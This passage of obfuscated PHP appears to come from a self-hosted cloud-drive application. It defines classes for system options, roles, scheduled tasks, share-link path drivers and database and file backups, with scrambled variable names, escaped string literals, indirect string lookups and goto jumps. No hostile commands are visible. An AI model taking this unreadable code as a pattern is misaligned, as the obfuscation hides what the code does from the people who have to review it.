$úİ¯Äœœ) { return parent::update($Á«·–Êğ, $úİ¯Äœœ); } public function enable($ô“Å£Ú’, $ƒÃÜ¦É°) { return parent::update($ô“Å£Ú’, array($_SERVER[ùèÅ´Ãš][2480] => $ƒÃÜ¦É°)); } private function initUserOption() { $€Üı³²ç =& $_SERVER[ùèÅ´Ãš]; $this->optionType = $€Üı³²ç[2481]; $this->modelType = $€Üı³²ç[2482]; $this->field = array($€Üı³²ç[2483], $€Üı³²ç[32], $€Üı³²ç[207], $€Üı³²ç[33], $€Üı³²ç[2484], $€Üı³²ç[827], $€Üı³²ç[229]); } public function userNoticeGet($»ß¥ ì = false) { $this->initUserOption(); return parent::listData($»ß¥ ì, $_SERVER[ùèÅ´Ãš][477], !0); } public function userNoticeAdd($Ëû¢ñû¨) { $ ãß¯Ğ¤ =& $_SERVER[ùèÅ´Ãš]; $this->initUserOption(); $†ˆ¤ÓÆŒ = $this->findByKey($ ãß¯Ğ¤[2483], $Ëû¢ñû¨[$ ãß¯Ğ¤[477]]); if ($†ˆ¤ÓÆŒ) { return !0; } $Ë»½ô = array($ ãß¯Ğ¤[2483] => $Ëû¢ñû¨[$ ãß¯Ğ¤[477]], $ ãß¯Ğ¤[32] => $Ëû¢ñû¨[$ ãß¯Ğ¤[32]], $ ãß¯Ğ¤[207] => $Ëû¢ñû¨[$ ãß¯Ğ¤[207]], $ ãß¯Ğ¤[33] => isset($Ëû¢ñû¨[$ ãß¯Ğ¤[33]]) ? $Ëû¢ñû¨[$ ãß¯Ğ¤[33]] : 1, $ ãß¯Ğ¤[2484] => isset($Ëû¢ñû¨[$ ãß¯Ğ¤[2484]]) ? $Ëû¢ñû¨[$ ãß¯Ğ¤[2484]] : 0, $ ãß¯Ğ¤[827] => 0, $ ãß¯Ğ¤[229] => 0); return parent::insert($Ë»½ô); } public function userNoticeEdit($¹’†³ëÛ, $ùÈïáó¼) { $this->initUserOption(); return parent::update($¹’†³ëÛ, $ùÈïáó¼); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\155\137\157\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\x6e\165", "\162\x6f\x6c\145", "\162\157\154\145\x47\x72\x6f\x75\x70", "\162\x65\x67\x69\x73\164", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($İ»’ÙÁ) { return "\123\171\163\x74\x65\x6d\117\160\x74\x69\157\156\137{$İ»’ÙÁ}"; } protected function optionDefault($ØÓëšë» = '') { $“›çîÓù =& $_SERVER[ùèÅ´Ãš]; if ($ØÓëšë» == $“›çîÓù[12]) { return $GLOBALS[$“›çîÓù[6]][$“›çîÓù[459]]; } } } goto cÊ‘×Ë‘å´; cÊ‘×Ë‘å´: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x72\x6f\154\145\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\141\x75\x74\x68", "\x6c\x61\x62\145\x6c", "\144\151\163\x70\154\141\171", "\163\x79\163\164\145\155", "\x64\145\163\143", "\x69\x67\x6e\x6f\x72\x65\x45\170\x74", "\151\x67\156\x6f\162\x65\x46\151\154\x65\x53\x69\172\x65", "\141\144\155\151\x6e\151\x73\164\x72\x61\x74\x6f\162", "\x73\157\162\164"); public function listData($İÓŠµÓ¿ = false, $Íïš™ø = "\x73\157\162\164", $«Ã‰²õ¤ = false) { $‚í·ÚËï =& $_SERVER[ùèÅ´Ãš]; $¸Ä¤Ò = parent::listData($İÓŠµÓ¿, $Íïš™ø, $«Ã‰²õ¤); if (!$İÓŠµÓ¿) { foreach ($¸Ä¤Ò as $ã¥Åşâ³ => $¢÷«ù™Î) { if ($¢÷«ù™Î[$‚í·ÚËï[2209]] == 1) { $¸Ä¤Ò[$ã¥Åşâ³][$‚í·ÚËï[528]] = LNG($‚í·ÚËï[2485]); } } } return $¸Ä¤Ò; } public function update($ªÀæí¬Â, $¿è¿âÏâ) { $ì››ì£Ó =& $_SERVER[ùèÅ´Ãš]; $ÄÃ¡ş‹· = parent::listData($ªÀæí¬Â); $¾¯ñŠ° = $this->findByName($¿è¿âÏâ[$ì››ì£Ó[32]]); if (!$ÄÃ¡ş‹· || $¾¯ñŠ° && $¾¯ñŠ°[$ì››ì£Ó[477]] != $ÄÃ¡ş‹·[$ì››ì£Ó[477]]) { return !1; } if ($¾¯ñŠ°[$ì››ì£Ó[2209]] == 1) { $¿è¿âÏâ = array($ì››ì£Ó[32] => $¿è¿âÏâ[$ì››ì£Ó[32]], $ì››ì£Ó[2020] => $¿è¿âÏâ[$ì››ì£Ó[2020]]); } $this->filterAuth($¿è¿âÏâ[$ì››ì£Ó[489]]); return parent::update($ªÀæí¬Â, $¿è¿âÏâ); } public function remove($‰óÌø…’) { $ƒ·¥Ë¿Ø = parent::listData($‰óÌø…’); if (!$ƒ·¥Ë¿Ø || $ƒ·¥Ë¿Ø[$_SERVER[ùèÅ´Ãš][192]]) { return !1; } return parent::remove($‰óÌø…’); } public function add($§¶Î¬¸«) { $ëœâ™¤Ä =& $_SERVER[ùèÅ´Ãš]; $³ÜßïÓ = $§¶Î¬¸«[$ëœâ™¤Ä[32]]; if ($this->findByName($³ÜßïÓ)) { return !1; } $ŞŠó¨õŠ = array($ëœâ™¤Ä[496] => $³ÜßïÓ, $ëœâ™¤Ä[2003] => $ëœâ™¤Ä[12], $ëœâ™¤Ä[1999] => $ëœâ™¤Ä[2007], $ëœâ™¤Ä[2486] => 1, $ëœâ™¤Ä[2002] => 0, $ëœâ™¤Ä[2487] => 0, $ëœâ™¤Ä[2001] => $this->getSort()); $§¶Î¬¸« = array_merge($ŞŠó¨õŠ, $§¶Î¬¸«); $this->filterAuth($§¶Î¬¸«[$ëœâ™¤Ä[489]]); return parent::insert($§¶Î¬¸«); } private function getSort() { $…ƒ€œ¯Ÿ =& $_SERVER[ùèÅ´Ãš]; $œÍ©Å¾ß = parent::listData(); $Ö¢‚˜û† = array_to_keyvalue($œÍ©Å¾ß, $…ƒ€œ¯Ÿ[12], $…ƒ€œ¯Ÿ[2021]); return empty($Ö¢‚˜û†) ? 0 : max($Ö¢‚˜û†) + 1; } private function filterAuth(&$ƒœŞĞ„’) { $£±›Ä±ë =& $_SERVER[ùèÅ´Ãš]; $±‰¤è = array(); $¾–ùâ¶Ë = array_filter(explode($£±›Ä±ë[50], $ƒœŞĞ„’)); foreach ($¾–ùâ¶Ë as $ƒœŞĞ„’) { $¤˜¿Èßñ = explode($£±›Ä±ë[10], $ƒœŞĞ„’); if ($¤˜¿Èßñ[0] == $£±›Ä±ë[2488] && $¤˜¿Èßñ[1] != $£±›Ä±ë[1289]) { $§Â¦é©Ş = $¤˜¿Èßñ[0] . $£±›Ä±ë[10] . $¤˜¿Èßñ[1] . $£±›Ä±ë[2489]; if (!in_array($§Â¦é©Ş, $¾–ùâ¶Ë)) { $±‰¤è[] = $§Â¦é©Ş; } } $±‰¤è[] = $ƒœŞĞ„’; } $ƒœŞĞ„’ = implode($£±›Ä±ë[50], $±‰¤è); } public function findRoleDefault() { $ş¤´Ğ ó =& $_SERVER[ùèÅ´Ãš]; $™õ‹ñÍ¹ = parent::listData(); $êñå·ı¨ = !1; foreach ($™õ‹ñÍ¹ as $™øğÍ±°) { if (!$™øğÍ±° || $™øğÍ±°[$ş¤´Ğ ó[2019]] == $ş¤´Ğ ó[231] || $™øğÍ±°[$ş¤´Ğ ó[2209]] == 1) { continue; } if (strstr($™øğÍ±°[$ş¤´Ğ ó[489]], $ş¤´Ğ ó[2490])) { continue; } if (!strstr($™øğÍ±°[$ş¤´Ğ ó[489]], $ş¤´Ğ ó[2491])) { continue; } if (!$êñå·ı¨) { $êñå·ı¨ = $™øğÍ±°; continue; } $Ú“ŸÍè = explode($ş¤´Ğ ó[50], $êñå·ı¨[$ş¤´Ğ ó[489]]); $á²€Íø = explode($ş¤´Ğ ó[50], $™øğÍ±°[$ş¤´Ğ ó[489]]); if (count($Ú“ŸÍè) > count($á²€Íø)) { $êñå·ı¨ = $™øğÍ±°; } } return $êñå·ı¨ ? $êñå·ı¨[$ş¤´Ğ ó[477]] : $ş¤´Ğ ó[12]; } public function sort($¾Àî˜ã , $ì¼‹øÀ) { return parent::update($¾Àî˜ã , $ì¼‹øÀ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x74\x61\163\153\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\164\171\160\x65", "\x65\x76\145\x6e\164", "\164\x69\155\x65", "\144\145\163\143", "\x73\x79\x73\164\145\155", "\145\x6e\x61\142\x6c\145", "\154\x61\x73\x74\122\x75\x6e", "\x73\157\162\164"); public function listData($ÙÀÙ¸© = false, $—Êä·ŞÑ = "\163\x6f\x72\x74", $ƒıíö³Å = false) { return parent::listData($ÙÀÙ¸©, $—Êä·ŞÑ, $ƒıíö³Å); } public function add($è ‘¢€) { $üãÔ–Ä« =& $_SERVER[ùèÅ´Ãš]; $´ƒå¸Ü¬ = $this->findByName($è ‘¢€[$üãÔ–Ä«[32]]); if ($´ƒå¸Ü¬) { return !1; } $è ‘¢€[$üãÔ–Ä«[1747]] = 0; $è ‘¢€[$üãÔ–Ä«[2021]] = $this->getSort(); return parent::insert($è ‘¢€); } private function getSort() { $Æâ½‘Œ =& $_SERVER[ùèÅ´Ãš]; $ƒë‘ˆä” = parent::listData(); $Ö „Æéƒ = array_to_keyvalue($ƒë‘ˆä”, $Æâ½‘Œ[12], $Æâ½‘Œ[2021]); return empty($Ö „Æéƒ) ? 0 : max($Ö „Æéƒ) + 1; } public function update($ĞçÔüÃ, $ÂËÑ™) { $Øé±á€® =& $_SERVER[ùèÅ´Ãš]; $ÖÛ¹ÛâŸ = $this->listData($ĞçÔüÃ); $¦¿ç‰İ¾ = $this->findByName($ÂËÑ™[$Øé±á€®[32]]); if (!$ÖÛ¹ÛâŸ || $¦¿ç‰İ¾ && $¦¿ç‰İ¾[$Øé±á€®[477]] != $ÖÛ¹ÛâŸ[$Øé±á€®[477]]) { return !1; } return parent::update($ĞçÔüÃ, $ÂËÑ™); } public function remove($™å•à»¡, $£ù¬©³Ù = false) { $ÂÂÊ‚™Û =& $_SERVER[ùèÅ´Ãš]; $ÅÒå³™… = $this->listData($™å•à»¡); if (!$ÅÒå³™…) { return; } if (!$£ù¬©³Ù && $ÅÒå³™…[$ÂÂÊ‚™Û[192]] == $ÂÂÊ‚™Û[91]) { return !1; } return parent::remove($™å•à»¡); } public function enable($ğÁ”üš, $‚å”çúÚ) { return $this->update($ğÁ”üš, array($_SERVER[ùèÅ´Ãš][2480] => $‚å”çúÚ)); } public function run($ß†‡…É€) { return $this->update($ß†‡…É€, array($_SERVER[ùèÅ´Ãš][2492] => time())); } } goto béÃ†ÜÜ¹¼; cÔ¦§·ÆÍ‰: class PathDriverDbShareLink extends PathDriverDB { public function __construct($íÇº‚) { $this->pathParse = $íÇº‚; $this->model = Model($_SERVER[ùèÅ´Ãš][1442]); } protected function infoParse($ôàº•á—, $÷Úßï«³ = false, $Ó¢ş‚£´ = false) { $‘úŠÍƒô =& $_SERVER[ùèÅ´Ãš]; return Action($‘úŠÍƒô[1270])->sharePathInfo($this->pathParse[$‘úŠÍƒô[87]], !0, $÷Úßï«³); } public function listPath($ùƒíº, $ˆÌ½ºÁ  = false) { $Î«ğÒ =& $_SERVER[ùèÅ´Ãš]; $î·À•á„ = parent::listPath($ùƒíº, $ˆÌ½ºÁ ); if (!$î·À•á„) { return $î·À•á„; } if (is_array($î·À•á„[$Î«ğÒ[1450]])) { $î·À•á„[$Î«ğÒ[1450]] = Action($Î«ğÒ[1270])->shareItemInfo($î·À•á„[$Î«ğÒ[1450]]); } foreach ($î·À•á„ as $Ÿâ¤œüá => $Ô—§İß°) { if (!in_array($Ÿâ¤œüá, array($Î«ğÒ[86], $Î«ğÒ[85]))) { continue; } foreach ($Ô—§İß° as $ìÃ‰ úÏ => $”¶ÊÃÏ) { $î·À•á„[$Ÿâ¤œüá][$ìÃ‰ úÏ] = Action($Î«ğÒ[1270])->shareItemInfo($”¶ÊÃÏ); } } return $î·À•á„; } public function listAll($ş»´ñıÔ) { $ˆ˜ã¿î =& $_SERVER[ùèÅ´Ãš]; $®Å½¢¶ş = IO::info($this->pathParse[$ˆ˜ã¿î[87]]); if (!$®Å½¢¶ş) { return array(); } $öÖğËƒ = $this->model->listAll($ş»´ñıÔ); foreach ($öÖğËƒ as &$å›Èß›) { $å›Èß›[$ˆ˜ã¿î[90]] = Action($ˆ˜ã¿î[1270])->shareItemInfo($å›Èß›[$ˆ˜ã¿î[90]]); } unset($å›Èß›); return $öÖğËƒ; } } class PathDriverDriverShareItem { public function __construct($¾•Éæïğ) { $this->pathParse = $¾•Éæïğ; } public function __call($æî·¾àÍ, $Õ­¯å™Ş) { $ÆÇê±‚¶ =& $_SERVER[ùèÅ´Ãš]; if (method_exists($this, $æî·¾àÍ)) { return; } $ïÏÖ»Çô = call_user_func_array(array($ÆÇê±‚¶[1451], $æî·¾àÍ), $Õ­¯å™Ş); $ÔÚ¬Šóğ = array($ÆÇê±‚¶[1452], $ÆÇê±‚¶[1453], $ÆÇê±‚¶[1454], $ÆÇê±‚¶[1455], $ÆÇê±‚¶[625], $ÆÇê±‚¶[627], $ÆÇê±‚¶[1456], $ÆÇê±‚¶[110], $ÆÇê±‚¶[1457], $ÆÇê±‚¶[1458]); if (in_array($æî·¾àÍ, $ÔÚ¬Šóğ)) { $ïÏÖ»Çô = $this->getPathOuter($ïÏÖ»Çô); } return $ïÏÖ»Çô; } public function copy($ŞóÜ¹š, $—íØÄ„, $‡şë¿µı = false, $å¸Š—­š = false) { return $this->copyMove($ŞóÜ¹š, $—íØÄ„, $‡şë¿µı, $_SERVER[ùèÅ´Ãš][625], $å¸Š—­š); } public function move($üÜğˆ¤•, $ôõ¡é•, $œÍƒëÅ = false, $Òî¤İ€è = false) { return $this->copyMove($üÜğˆ¤•, $ôõ¡é•, $œÍƒëÅ, $_SERVER[ùèÅ´Ãš][627], $Òî¤İ€è); } private function copyMove($«ÇÍ“œ”, $¿…³˜è, $·¹°¤ı, $¸ö¸—ñ‚, $°‘â§¨Š = false) { $³¢ºíë =& $_SERVER[ùèÅ´Ãš]; $ıå¬õÒ = $¿…³˜è; $èƒ…Ç»™ = IO::driverMake($¿…³˜è); if ($èƒ…Ç»™->pathParse[$³¢ºíë[1244]]) { $¿…³˜è = $èƒ…Ç»™->pathParse[$³¢ºíë[1244]]; } else { $¿…³˜è = $ıå¬õÒ; } $ßıÍæå = IO::copyMove($«ÇÍ“œ”, $¿…³˜è, $·¹°¤ı, $¸ö¸—ñ‚, $°‘â§¨Š); $ßıÍæå = $this->getPathOuter($ßıÍæå); return $ßıÍæå; } public function pathThis($Ü¤ëõ¶”) { return get_path_this($this->pathParse[$_SERVER[ùèÅ´Ãš][87]]); } public function pathFather($ó­©šÂ) { return get_path_father($this->pathParse[$_SERVER[ùèÅ´Ãš][87]]); } public function iconvSystem($Œ¢ÊûäÀ) { return $Œ¢ÊûäÀ; } protected function infoParse($ÙÊŒíí†, $§ıûÅª = false) { $ƒø†÷öâ =& $_SERVER[ùèÅ´Ãš]; $‹ø™¡µÔ = $this->pathParse[$ƒø†÷öâ[564]][$ƒø†÷öâ[1271]] . $this->pathParse[$ƒø†÷öâ[1263]]; if ($§ıûÅª) { $ÈÙÅûâÃ = IO::infoWithChildren($‹ø™¡µÔ); } else { $ÈÙÅûâÃ = IO::info($‹ø™¡µÔ); } $Ş£ÈøÖ¥ = $this->pathParse[$ƒø†÷öâ[564]]; return Action($ƒø†÷öâ[1449])->_shareItemeParse($ÈÙÅûâÃ, $Ş£ÈøÖ¥); } public function listAll($óºÛ¥ÖÀ) { $¯ÙÊØéê =& $_SERVER[ùèÅ´Ãš]; $¯…Üüê“ = IO::listAll($óºÛ¥ÖÀ); $ÑÙì½Õò = rtrim($this->pathParse[$¯ÙÊØéê[564]][$¯ÙÊØéê[1271]], $¯ÙÊØéê[8]); foreach ($¯…Üüê“ as &$–ª ®ûâ) { $–ª ®ûâ[$¯ÙÊØéê[87]] = $this->pathDriver . $¯ÙÊØéê[8] . ltrim(substr($–ª ®ûâ[$¯ÙÊØéê[87]], strlen($ÑÙì½Õò)), $¯ÙÊØéê[8]); } unset($–ª ®ûâ); return $¯…Üüê“; } public function listAllSimple($ˆ¬¥±ô, $Òüô‚šÌ = false) { $©Ş³•ÚÎ =& $_SERVER[ùèÅ´Ãš]; $Œ¼ùı¥£ = $this->listAll($ˆ¬¥±ô); $øõîÚ = $this->pathParse[$©Ş³•ÚÎ[497]]; if (trim($øõîÚ, $©Ş³•ÚÎ[8]) == trim(get_path_father($øõîÚ), $©Ş³•ÚÎ[8])) { $Òüô‚šÌ = !0; } return IO::init($©Ş³•ÚÎ[12])->listAllSimpleMake($Œ¼ùı¥£, $øõîÚ, $Òüô‚šÌ); } public function getPathOuter($†ì­¡Ã) { $âçÅü×£ =& $_SERVER[ùèÅ´Ãš]; $‚Ï·­à = KodIO::parse($†ì­¡Ã); if ($‚Ï·­à[$âçÅü×£[33]] == KodIO::KOD_SHARE_ITEM) { return $‚Ï·­à[$âçÅü×£[87]]; } $²ü™Êïı = KodIO::clear($†ì­¡Ã); $¤‚ã¨¥õ = KodIO::clear($this->pathParse[$âçÅü×£[564]][$âçÅü×£[1271]]); $ãĞôí–– = substr($²ü™Êïı, strlen($¤‚ã¨¥õ)); if (substr($²ü™Êïı, 0, strlen($¤‚ã¨¥õ)) != $¤‚ã¨¥õ) { return !1; } return $this->pathParse[$âçÅü×£[1264]] . $âçÅü×£[8] . ltrim($ãĞôí––, $âçÅü×£[8]); } public function getType() { $ñûÍíœ =& $_SERVER[ùèÅ´Ãš]; $Üòúô‡¹ = str_replace($ñûÍíœ[77], $ñûÍíœ[12], get_class($this)); return strtolower($Üòúô‡¹); } public function isOsDriver($–‹î…€¯) { return IO::isOsDriver($–‹î…€¯); } public function info($íá±¿×›) { return $this->infoParse($íá±¿×›); } public function infoAuth($‹€ˆä¡ğ) { return $this->infoParse($‹€ˆä¡ğ); } public function infoWithChildren($ÏúƒşÀˆ) { return $this->infoParse($ÏúƒşÀˆ, !0); } public function infoFull($şÅï¹´) { return $this->infoParse($şÅï¹´); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Şö¼Ú˜) { $this->pathParse = $Şö¼Ú˜; } protected function infoParse($·º³©…“, $ÖÄ¹ƒ = false) { $àª³Ú´ =& $_SERVER[ùèÅ´Ãš]; return Action($àª³Ú´[1270])->sharePathInfo($this->pathParse[$àª³Ú´[87]], !0, $ÖÄ¹ƒ); } public function listPath($ÕĞ‡æßÄ, $éÄä‰£ = false) { $¦×ªÉÛË =& $_SERVER[ùèÅ´Ãš]; $Ù¤ô—ó½ = IO::listPath($ÕĞ‡æßÄ, $éÄä‰£); if (!$Ù¤ô—ó½) { return $Ù¤ô—ó½; } if (is_array($Ù¤ô—ó½[$¦×ªÉÛË[1450]])) { $ß»†ÁÑù = Action($¦×ªÉÛË[1459])->parsePathChildren($Ù¤ô—ó½[$¦×ªÉÛË[1450]], array($¦×ªÉÛË[497] => $ÕĞ‡æßÄ)); $Ù¤ô—ó½[$¦×ªÉÛË[1450]] = Action($¦×ªÉÛË[1270])->shareItemInfo($ß»†ÁÑù); } foreach ($Ù¤ô—ó½ as $Ç…õ„¿ => $‹€¼Ø†¿) { if (!in_array($Ç…õ„¿, array($¦×ªÉÛË[86], $¦×ªÉÛË[85]))) { continue; } foreach ($‹€¼Ø†¿ as $ÌùÃÇ÷ => $ß»†ÁÑù) { $ß»†ÁÑù = Action($¦×ªÉÛË[1459])->parsePathChildren($ß»†ÁÑù, array($¦×ªÉÛË[497] => $ÕĞ‡æßÄ)); $Ù¤ô—ó½[$Ç…õ„¿][$ÌùÃÇ÷] = Action($¦×ªÉÛË[1270])->shareItemInfo($ß»†ÁÑù); } } return $Ù¤ô—ó½; } } goto e’Ö¯îĞàƒ; a£†ÅŠäŒ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ùèÅ´Ãš][825]); $this->init(); $this->keep(); } public function init() { $…”Ö£œ =& $_SERVER[ùèÅ´Ãš]; $this->isManual(); self::$name = date($…”Ö£œ[826]); if (!($Ï·®ØÅÉ = $this->model->lastItem())) { $Ï·®ØÅÉ = $this->initData(); } else { self::$name = $Ï·®ØÅÉ[$…”Ö£œ[32]]; if ($Ï·®ØÅÉ[$…”Ö£œ[827]] == $…”Ö£œ[91]) { self::$name = date($…”Ö£œ[262]); $¸ÇğŸÜ˜ = intval(_get($Ï·®ØÅÉ, $…”Ö£œ[828], 0)); if (self::$manual == 0 && $Ï·®ØÅÉ[$…”Ö£œ[32]] == self::$name) { $this->model->remove($Ï·®ØÅÉ[$…”Ö£œ[477]]); } $Ï·®ØÅÉ = $this->initData($¸ÇğŸÜ˜, $Ï·®ØÅÉ[$…”Ö£œ[829]]); } else { $this->checkStore($Ï·®ØÅÉ[$…”Ö£œ[829]]); } } self::$option = $Ï·®ØÅÉ; } private function isManual() { $¯´ı°ó = _get($GLOBALS, $_SERVER[ùèÅ´Ãš][830], 0); $¯´ı°ó = intval($¯´ı°ó); self::$manual = $¯´ı°ó && $¯´ı°ó == 1 ? 1 : 0; } private function initData($ˆÒŞ¶­ = 0, $˜•ß·˜ = '') { $Ó²öØÒ€ =& $_SERVER[ùèÅ´Ãš]; $ŸºÀÉŞÆ = $this->model->config(); if ($˜•ß·˜ && $ŸºÀÉŞÆ[$Ó²öØÒ€[829]] != $˜•ß·˜) { $ˆÒŞ¶­ = 0; } $this->checkStore($ŸºÀÉŞÆ[$Ó²öØÒ€[829]]); if (self::$manual == 1) { self::$name .= $Ó²öØÒ€[11] . date($Ó²öØÒ€[831]); } $ºşúÀúª = array($Ó²öØÒ€[829] => $ŸºÀÉŞÆ[$Ó²öØÒ€[829]], $Ó²öØÒ€[32] => self::$name, $Ó²öØÒ€[827] => 0, $Ó²öØÒ€[171] => $ŸºÀÉŞÆ[$Ó²öØÒ€[171]], $Ó²öØÒ€[832] => self::$manual, $Ó²öØÒ€[833] => array($Ó²öØÒ€[834] => array($Ó²öØÒ€[827] => 0), $Ó²öØÒ€[835] => array($Ó²öØÒ€[827] => 0, $Ó²öØÒ€[836] => 0, $Ó²öØÒ€[837] => 0, $Ó²öØÒ€[33] => $Ó²öØÒ€[12], $Ó²öØÒ€[838] => 0, $Ó²öØÒ€[839] => 0), $Ó²öØÒ€[840] => array($Ó²öØÒ€[827] => 0, $Ó²öØÒ€[836] => 0, $Ó²öØÒ€[837] => 0, $Ó²öØÒ€[838] => 0, $Ó²öØÒ€[839] => 0), $Ó²öØÒ€[233] => array($Ó²öØÒ€[827] => 0, $Ó²öØÒ€[841] => 0, $Ó²öØÒ€[842] => 0, $Ó²öØÒ€[843] => 0, $Ó²öØÒ€[844] => 0, $Ó²öØÒ€[545] => $ˆÒŞ¶­, $Ó²öØÒ€[838] => 0, $Ó²öØÒ€[839] => 0)), $Ó²öØÒ€[838] => time(), $Ó²öØÒ€[839] => 0); $³±ˆºÏ = $this->model->insert($ºşúÀúª); $ºşúÀúª[$Ó²öØÒ€[477]] = $³±ˆºÏ; return $ºşúÀúª; } private function checkStore($ÍåÈí¾§) { $º±…”ß“ = Model($_SERVER[ùèÅ´Ãš][845]); $ñ¢ÓÀŸ = $º±…”ß“->listData($ÍåÈí¾§); $º±…”ß“->checkConfig($ñ¢ÓÀŸ); } public static function get() { if (!self::$option) { $Å¬Õû­¥ = Model($_SERVER[ùèÅ´Ãš][825]); $¿‰æ•âå = $Å¬Õû­¥->findByName(self::$name); $Å¬Õû­¥->parseContent($¿‰æ•âå); self::$option = $¿‰æ•âå; } return self::$option; } public static function set($©›üá÷) { $„çæ¯˜Ï =& $_SERVER[ùèÅ´Ãš]; $›Ñ–ç¨ú = self::get(); foreach ($©›üá÷ as $÷÷¶®¶ => $³¡¹»İ) { array_set_value($›Ñ–ç¨ú, $÷÷¶®¶, $³¡¹»İ); } Model($„çæ¯˜Ï[825])->update($›Ñ–ç¨ú[$„çæ¯˜Ï[477]], $›Ñ–ç¨ú); self::$option = $›Ñ–ç¨ú; return self::$option; } public function keep() { $ğ“ìğ·× =& $_SERVER[ùèÅ´Ãš]; $Ş÷²œ½¸ = self::get(); if (_get($Ş÷²œ½¸, $ğ“ìğ·×[846], 0) == $ğ“ìğ·×[91]) { return; } $this->backupKeep($Ş÷²œ½¸); self::set(array($ğ“ìğ·×[846] => 1)); } private function backupKeep($û–Ô½ƒ) { $à©ïŒ =& $_SERVER[ùèÅ´Ãš]; if (self::$manual == 1) { return; } $û˜ÊíƒŠ = $this->model->listData(); if (empty($û˜ÊíƒŠ)) { return; } $“öÚÏ¾ë = 0; $‡àíÚª = array(); foreach ($û˜ÊíƒŠ as $¤ØÈ¶–®) { if ($“öÚÏ¾ë >= 7) { break; } $‡àíÚª[] = $¤ØÈ¶–®[$à©ïŒ[32]]; $“öÚÏ¾ë++; } for ($“öÚÏ¾ë = 0; $“öÚÏ¾ë < 12; $“öÚÏ¾ë++) { $‡àíÚª[] = date($à©ïŒ[847], strtotime("\x2d{$“öÚÏ¾ë}\40\155\x6f\156\x74\150\x73")); } $‡àíÚª = array_unique($‡àíÚª); $İí´¦ÈŞ = Model($à©ïŒ[848])->get($à©ïŒ[849]); foreach ($û˜ÊíƒŠ as $¤ØÈ¶–®) { if (isset($¤ØÈ¶–®[$à©ïŒ[832]]) && $¤ØÈ¶–®[$à©ïŒ[832]] == $à©ïŒ[91]) { continue; } if (!empty($¤ØÈ¶–®[$à©ïŒ[32]]) && in_array($¤ØÈ¶–®[$à©ïŒ[32]], $‡àíÚª)) { continue; } $this->model->remove($¤ØÈ¶–®[$à©ïŒ[477]]); $îä¡ = $this->backupPath($û–Ô½ƒ, $İí´¦ÈŞ); IO::remove($îä¡, !1); } } private function backupPath($Û¦ÈÒíÆ, $èâÔ³¹× = false) { $“­–£Í˜ =& $_SERVER[ùèÅ´Ãš]; if (!$èâÔ³¹×) { $èâÔ³¹× = Model($“­–£Í˜[848])->get($“­–£Í˜[849]); } $Ø—÷¹Ö = $Û¦ÈÒíÆ[$“­–£Í˜[32]]; $°Å›Èà = substr(md5($“­–£Í˜[850] . $èâÔ³¹× . $Ø—÷¹Ö), 0, 8); return "\173\151\x6f\72{$Û¦ÈÒíÆ[$“­–£Í˜[829]]}\x7d\57\144\141\x74\x61\x62\x61\x73\145\x2f\142\x61\143\153\x75\160\x2f" . $Ø—÷¹Ö . $“­–£Í˜[11] . $°Å›Èà; } public function db() { $½›«»Ù¼ =& $_SERVER[ùèÅ´Ãš]; $†¾Ó°ø­ = self::get(); if (_get($†¾Ó°ø­, $½›«»Ù¼[851], 0) == $½›«»Ù¼[91]) { return !0; } $¤·™Ô¢ó = new BackupDb(); if (!$¤·™Ô¢ó->index()) { return !1; } self::set(array($½›«»Ù¼[851] => 1)); return !0; } public function dbFile() { $™øØ¾Ñ =& $_SERVER[ùèÅ´Ãš]; $éïÎ©˜… = self::get(); if (_get($éïÎ©˜…, $™øØ¾Ñ[852], 0) == $™øØ¾Ñ[91]) { return !0; } $Àšá¢Í¡ = new BackupDbFile(); if (!$Àšá¢Í¡->index()) { return !1; } self::set(array($™øØ¾Ñ[852] => 1)); return !0; } public function file() { $®¿‘ =& $_SERVER[ùèÅ´Ãš]; $ØÉöè‘ = self::get(); if (_get($ØÉöè‘, $®¿‘[853], 0) == $®¿‘[91]) { return !0; } if ($ØÉöè‘[$®¿‘[171]] == $®¿‘[854]) { $ËòŞòË = new BackupFile(); if (!$ËòŞòË->index()) { return !1; } } self::set(array($®¿‘[853] => 1, $®¿‘[827] => 1)); return !0; } public static function log($æ‰Ú·›) { write_log($æ‰Ú·›, $_SERVER[ùèÅ´Ãš][855]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÍûÍ¨¢¶ =& $_SERVER[ùèÅ´Ãš]; $Â£ƒÕñ‹ = Backup::get(); self::$io = $Â£ƒÕñ‹[$ÍûÍ¨¢¶[829]]; self::$name = $Â£ƒÕñ‹[$ÍûÍ¨¢¶[32]]; $¡Ïú´Ø = new DbManage(); $ÅÁ£Û§„ = $¡Ïú´Ø->dbType(); $î›ıëµÚ = array($ÍûÍ¨¢¶[856] => $ÅÁ£Û§„, $ÍûÍ¨¢¶[857] => time()); Backup::set($î›ıëµÚ); $¥æüñåé = $this->tmpFilesPath() . $ÍûÍ¨¢¶[858] . self::$name . $ÍûÍ¨¢¶[8]; del_dir($¥æüñåé); mk_dir($¥æüñåé); $µ€§ÑĞ = $ä¹ÚÃÈ˜ = 0; try { $şŸÉã = $¡Ïú´Ø->db()->getTables(); } catch (Exception $Ø’¼Ä—) { Backup::log($ÍûÍ¨¢¶[859] . $Ø’¼Ä—->getMessage()); return !1; } $şŸÉã = array_diff($şŸÉã, array($ÍûÍ¨¢¶[860], $ÍûÍ¨¢¶[861])); foreach ($şŸÉã as $öø¼’¦Ş) { if ($öø¼’¦Ş == $ÍûÍ¨¢¶[862]) { continue; } $µ€§ÑĞ += $¡Ïú´Ø->model($öø¼’¦Ş)->count(); } $—éŠğó— = new Task($ÍûÍ¨¢¶[863], $ÍûÍ¨¢¶[855], $µ€§ÑĞ, LNG($ÍûÍ¨¢¶[864]) . $ÍûÍ¨¢¶[865] . LNG($ÍûÍ¨¢¶[866])); $GLOBALS[$ÍûÍ¨¢¶[867]] = self::$name; foreach ($şŸÉã as $öø¼’¦Ş) { $ˆ“Š›½å = $¥æüñåé . $öø¼’¦Ş . 